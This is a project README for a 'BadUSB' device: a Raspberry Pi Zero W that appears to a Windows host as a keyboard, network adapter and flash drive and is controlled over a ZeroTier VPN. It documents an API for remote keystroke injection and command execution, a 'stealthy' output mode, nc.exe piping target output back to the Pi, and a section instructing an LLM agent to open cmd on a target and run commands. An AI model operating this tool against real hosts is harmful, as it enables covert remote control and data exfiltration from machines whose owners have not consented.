# VPN BadUSB — Bidirectional HID Bridge

Raspberry Pi Zero W as a USB composite gadget (keyboard + network + flash drive) controlled remotely via ZeroTier VPN. Allows an LLM or remote user to type keystrokes on any target host, capture command output, and exchange files — all over a single USB cable.

![WAN-BadUSB](cyber-football.svg)

## Hardware Requirements

| Component | Model / Spec | Purpose |
|-----------|-------------|---------|
| Raspberry Pi Zero W | v1 (ARMv6, 512MB RAM) | The gadget device |
| USB OTG adapter/stem | iUniker USB stem | Connects Pi's micro-USB data port to target host's USB-A |
| microSD card | 8GB+ (Class 10) | Pi OS + shared drive image |
| Power | Powered via USB from target host | No separate power supply needed |

The Pi Zero W v1 is specifically required — it has both USB OTG capability (for gadget mode) and onboard Wi-Fi (for independent internet access). The Pi Zero 2 W should also work but is untested.

## Software Requirements

### On the Pi
- **OS**: Raspberry Pi OS Lite (Bookworm, 32-bit ARM)
- **Python 3.13** with: `flask`, `flask-socketio`, `python-socketio`, `python-engineio`, `simple-websocket`, `bidict`, `h11`, `wsproto`
- **dnsmasq-base** (DHCP server for USB link)
- **NetworkManager** (Wi-Fi management)
- **Kernel modules**: `dwc2`, `libcomposite` (USB gadget support — enabled via `dtoverlay=dwc2` in config.txt and `modules-load=dwc2,libcomposite` in cmdline.txt)

### On the target host
- **Windows** (primary target — RNDIS driver support built-in)
- **nc.exe** on the PIDRIVE shared USB drive (for output capture via RNDIS)
- Firewall must allow nc.exe outbound to 192.168.19.1:9999

### VPN
- **ZeroTier** (free tier) — provides remote access to the Pi from anywhere
- Create a network at [my.zerotier.com](https://my.zerotier.com), join the Pi and your control machine
- The Pi's ZeroTier IP is configured as `192.168.192.101` in this setup — substitute your own ZeroTier IP wherever this appears in examples

## Network Architecture

```
Remote User / LLM (anywhere on the internet)
    │
    │ ZeroTier VPN (192.168.192.x)
    ▼
┌──────────────────────────────────────┐
│  Raspberry Pi Zero W (z3r0pi)        │
│  192.168.192.101 (ZeroTier)          │
│  192.168.19.1    (USB RNDIS)         │
│                                      │
│  Flask API :5000                     │
│  Output collector :9999 (RNDIS only) │
│                                      │
│  Wi-Fi ──→ internet (independent)    │
│  ZeroTier ──→ remote control         │
│  USB ──→ gadget functions            │
└──────────────────────────────────────┘
    │ USB cable (3 composite functions)
    ▼
┌──────────────────────────────────────┐
│  Target Host (Windows)               │
│  192.168.19.2-10 (DHCP from Pi)      │
│                                      │
│  Sees:                               │
│  ├── USB Keyboard (HID)              │
│  ├── USB Network Adapter (RNDIS)     │
│  └── USB Flash Drive (PIDRIVE)       │
└──────────────────────────────────────┘
```

## USB Composite Gadget

The Pi presents itself as three USB devices simultaneously via Linux USB ConfigFS:

1. **RNDIS** — USB network adapter (Windows-compatible). Creates a point-to-point IP link between Pi and host. Pi runs DHCP server to auto-assign IPs.
2. **HID Keyboard** — Standard USB keyboard. The Pi sends keystroke reports to type on the host. No drivers needed — works on any OS.
3. **Mass Storage** — 64MB FAT32 virtual flash drive (PIDRIVE). Both Pi and host can read/write. Used for file exchange and deploying tools (nc.exe).

## Initial Setup

### 1. Flash the Pi
- Flash Raspberry Pi OS Lite (Bookworm 32-bit) to microSD
- In `config.txt`, add: `dtoverlay=dwc2`
- In `cmdline.txt`, add after `rootwait`: `modules-load=dwc2,libcomposite`
- Enable SSH (create empty `ssh` file in boot partition)

### 2. Configure the Pi
SSH in and:
```bash
# Install dependencies
sudo apt install dnsmasq-base
sudo pip3 install flask flask-socketio simple-websocket --break-system-packages

# Install ZeroTier
curl -s https://install.zerotier.com | sudo bash
sudo zerotier-cli join <your-network-id>

# Add Wi-Fi networks (for independent internet)
sudo nmcli --ask dev wifi connect "YourSSID"
```

### 3. Deploy the gadget
From this repo:
```bash
PI_USER=pi ./deploy.sh <pi-ip>
```
`PI_USER` defaults to `pi` (the Raspberry Pi OS default). Set it if your username differs.
Or manually SCP the files:
- `pi/*` → `/opt/vpn-badusb/`
- `gadget/usb-gadget.sh` → `/usr/bin/usb-gadget.sh` (chmod +x)
- `gadget/dnsmasq-usb.conf` → `/etc/dnsmasq.d/usb-gadget.conf`
- `systemd/*.service` → `/etc/systemd/system/`

Then enable services:
```bash
sudo systemctl daemon-reload
sudo systemctl enable usb-gadget vpn-badusb dnsmasq-usb
```

### 4. Reboot and plug in
Reboot the Pi, then plug it into the target host via the iUniker stem. Windows should recognize three new USB devices.

Copy `tools/nc.exe` to the PIDRIVE (appears as a USB flash drive in Windows).

## Repository Structure

```
vpn-badusb/
├── deploy.sh                  # SCP all files to Pi + restart services
├── README.md                  # This file
├── pi/                        # Application files → /opt/vpn-badusb/ on Pi
│   ├── app.py                 # Main Flask+SocketIO server
│   ├── hid.py                 # Thread-safe HID keystroke engine
│   ├── output_collector.py    # TCP listener for command output capture
│   ├── mass_storage.py        # FAT32 shared drive manager
│   └── keyboard_client.py     # Interactive Python CLI for WebSocket streaming
├── gadget/                    # System configs → various Pi paths
│   ├── usb-gadget.sh          # Profile-aware gadget setup (teardown/rebuild)
│   ├── gadget-switch           # CLI tool for switching profiles at runtime
│   ├── usb-gadget.default      # Default boot profile (/etc/default/)
│   └── dnsmasq-usb.conf       # DHCP config for USB network link
├── hid-stream/                # Fast C keystroke binary
│   ├── hid-stream.c           # Source (cross-compile for ARMv6)
│   └── Makefile               # Build rules
├── systemd/                   # Service files → /etc/systemd/system/
│   ├── vpn-badusb.service     # Main app (Flask + output collector)
│   ├── usb-gadget.service     # Gadget setup (oneshot, runs at boot)
│   └── dnsmasq-usb.service    # DHCP for USB link
└── tools/
    ├── NC_EXE.md              # Download instructions for nc.exe (not included)
    └── pip-packages/          # Offline Python wheels for Pi
```

## API Reference

### Configuration
```
POST /config  {"drive_letter": "L", "default_capture": "rndis"}
GET  /config
```

### Type Text
```
POST /type  {"text": "hello world", "delay": 0.05}
```

### Special Keys
```
POST /key  {"name": "win"}
```
Keys: `enter`, `esc`, `backspace`, `tab`, `space`, `delete`, `home`, `end`,
`pageup`, `pagedown`, `up`, `down`, `left`, `right`, `f1`-`f12`,
`ctrl+a`, `ctrl+c`, `ctrl+v`, `ctrl+x`, `ctrl+z`, `ctrl+s`, `ctrl+l`, `ctrl+r`,
`alt+tab`, `alt+f4`, `win`, `win+r`, `win+e`, `win+d`

### Execute with Output Capture
```
POST /exec  {"cmd": "ipconfig /all", "capture": "rndis"}
```
Capture modes:
- `rndis` — pipes output via `nc.exe` back to Pi (fast)
- `drive` — redirects to shared USB drive (stealthy)
- `none` — types command as-is

Fetch results:
```
GET  /output?since=0&wait=10     # long-poll
GET  /output/stream?since=0      # SSE stream
DELETE /output                    # clear buffer
```

### Mass Storage (Shared USB Drive)
```
GET    /drive/files               # list files
GET    /drive/files/<name>        # download
POST   /drive/files/<name>        # upload (raw body)
DELETE /drive/files/<name>        # delete
```

### Bootstrap Target
```
POST /bootstrap
```
Opens cmd on target and tests connectivity. Note: nc.exe must be copied to PIDRIVE manually (Pi cannot write while host has drive mounted).

### Gadget Profile Switching
```
GET  /gadget/profile                          # current profile + available list
POST /gadget/profile  {"name": "hid-only"}    # switch profile (triggers USB reconnect)
```
Profiles: `hid-only`, `hid-storage`, `full` (see Usage section below)

### Health Check
```
GET /status
```

## Interactive Keyboard Client
```bash
python3 keyboard_client.py 192.168.192.101
```
- Type text → sent as keystrokes to target
- `!win` `!ctrl+c` `!enter` → special keys
- `/quit` `/status` `/help` → local commands
- Output from target displayed in green

## LLM Agent Connection Instructions

To control a target host via this gadget, an LLM agent should:

1. **Verify connectivity**: `GET http://192.168.192.101:5000/status`
2. **Configure drive letter** (varies per host): `POST /config {"drive_letter": "L"}`
3. **Ensure nc.exe is on the PIDRIVE** shared USB drive
4. **Open a command prompt on target**:
   ```
   POST /key  {"name": "win+r"}     → wait 2s
   POST /type {"text": "cmd\n"}     → wait 2s
   ```
5. **Execute commands with output capture**:
   ```
   POST /exec {"cmd": "whoami", "capture": "rndis"}
   GET  /output?since=<id>&wait=15
   ```
6. **Interactive typing**: WebSocket at `ws://192.168.192.101:5000`, emit `keystroke` events
7. **File operations**: `/drive/files/*` endpoints

**Important notes:**
- The Pi types on whatever window is **focused** on the target host
- The Pi reaches the internet via its own Wi-Fi — does not depend on the target host
- Target host firewall must allow nc.exe outbound to 192.168.19.1:9999
- The RNDIS adapter on the target gets its IP via DHCP from Pi's dnsmasq
- The Pi cannot write to the shared drive while the host has it mounted

## Usage

### Gadget Profiles

The Pi can present different USB function combinations depending on the target host OS. Not all hosts support the full RNDIS+HID+Storage composite (e.g., Android rejects it).

| Profile | USB Functions | Best For |
|---------|--------------|----------|
| `full` | RNDIS + HID + Mass Storage | Windows (default) |
| `hid-storage` | HID + Mass Storage | File exchange without RNDIS |
| `hid-only` | HID keyboard only | Android, Mac, Linux, ChromeOS |

**Switch via SSH CLI:**
```bash
sudo gadget-switch hid-only       # switch to HID-only
sudo gadget-switch full           # switch back to full composite
sudo gadget-switch                # show current profile
```

**Switch via API** (must use ZeroTier/Wi-Fi, not USB link):
```bash
curl -X POST http://192.168.192.101:5000/gadget/profile \
  -H "Content-Type: application/json" \
  -d '{"name": "hid-only"}'
```

**What happens during a switch:**
1. Current gadget is torn down (USB disconnect on target)
2. New gadget is built with selected functions
3. UDC is rebound (USB reconnect on target — new handshake)
4. dnsmasq stops/starts based on RNDIS presence
5. Flask API stays running throughout (Pi stays on Wi-Fi/ZeroTier)

**Default boot profile** is set in `/etc/default/usb-gadget` (deployed from `gadget/usb-gadget.default`).

### hid-stream — Fast Keystroke Binary

A compiled C binary for direct HID keystroke injection. Faster than the Flask API because it keeps `/dev/hidg0` open and avoids Python overhead. Useful when SSH'd into the Pi.

**Command-line mode** — type text and send keys:
```bash
sudo hid-stream -t "hello world" -k enter
sudo hid-stream -k win+r -d 500 -t "cmd" -k enter
sudo hid-stream -t "ipconfig /all" -k enter
```

Flags:
- `-t "text"` — type a text string
- `-k keyname` — send a special key (enter, ctrl+c, win+r, etc.)
- `-d N` — set inter-key delay in milliseconds (default: 10)
- Multiple `-t` and `-k` can be interleaved; `-d` applies to subsequent `-t` args

**Interactive mode** — real-time keyboard proxy:
```bash
sudo hid-stream
```
Everything you type is sent to the target as HID keystrokes in real-time.

| Input | Action |
|-------|--------|
| Normal keys | Sent as HID keystrokes |
| Arrow keys | Sent as HID arrow keys |
| Enter | Sent as HID enter |
| Backspace | Sent as HID backspace |
| Home / End | Sent as HID home/end |
| Delete | Sent as HID delete |
| Page Up/Down | Sent as HID page up/down |
| Ctrl+C | Sent as HID Ctrl+C (not SIGINT) |
| Ctrl+D | Quit hid-stream |
| ESC, q | Quit hid-stream |

**Building from source** (requires cross-compiler in WSL):
```bash
# Install cross-compiler
sudo apt install gcc-arm-linux-gnueabihf

# Build
cd hid-stream
make

# Or compile natively on the Pi (slower):
make native
```

### Workflow Examples

**Android/Linux target:**
```bash
# 1. Plug Pi into target
# 2. SSH in via ZeroTier
ssh pi@192.168.192.101

# 3. Switch to HID-only (Android doesn't support RNDIS composite)
sudo gadget-switch hid-only

# 4. Stream keystrokes interactively
sudo hid-stream

# 5. Or send a command
sudo hid-stream -t "hello from the Pi!" -k enter
```

**Windows target with output capture:**
```bash
# 1. Plug Pi into target (boots with full profile by default)
# 2. From remote machine via ZeroTier:
curl http://192.168.192.101:5000/status

# 3. Configure drive letter and run commands
curl -X POST http://192.168.192.101:5000/config \
  -d '{"drive_letter": "L"}'
curl -X POST http://192.168.192.101:5000/exec \
  -d '{"cmd": "whoami", "capture": "rndis"}'
curl "http://192.168.192.101:5000/output?since=0&wait=10"
```

**Switch profile mid-session:**
```bash
# Currently on full, need to switch to hid-only for a different host
curl -X POST http://192.168.192.101:5000/gadget/profile \
  -d '{"name": "hid-only"}'
# Unplug from Windows, plug into Android — HID works immediately
```

## Timing Guidelines
- After `win` key: wait **2 seconds**
- After `enter` to launch: wait **1-2 seconds**
- After typing: wait **500ms**
- Keystroke delay: `0.05` recommended

## Configuration

The Flask server reads one optional environment variable:

| Variable | Default | Purpose |
|----------|---------|---------|
| `SECRET_KEY` | random (per-restart) | Flask session signing key |

Copy `.env.example` to `.env` and set `SECRET_KEY` if you want sessions to survive service restarts. The systemd service can be extended with `EnvironmentFile=/opt/vpn-badusb/.env`.

## SSH Access
```
ssh pi@192.168.192.101      # via ZeroTier
ssh pi@192.168.19.1         # via USB link
```

Replace `pi` with your actual Pi username and `192.168.192.101` with your ZeroTier-assigned IP.

## Services (auto-start on boot)
- `vpn-badusb.service` — Flask API + output collector
- `usb-gadget.service` — USB composite gadget (RNDIS + HID + mass storage)
- `dnsmasq-usb.service` — DHCP for USB network link
- `zerotier-one.service` — VPN connectivity
- Wi-Fi via NetworkManager (auto-connects to known networks)

## Tested & Verified (2026-03-15)
- HID keystrokes: opens programs, types commands (Plex, AutoHotkey, cmd)
- Bidirectional exec: `whoami | L:\nc.exe 192.168.19.1 9999` → output captured successfully
- Mass storage: PIDRIVE visible on Windows, nc.exe deployed
- ZeroTier VPN: full remote control from any network
- Wi-Fi fallback: Pi auto-connects to known SSIDs independently
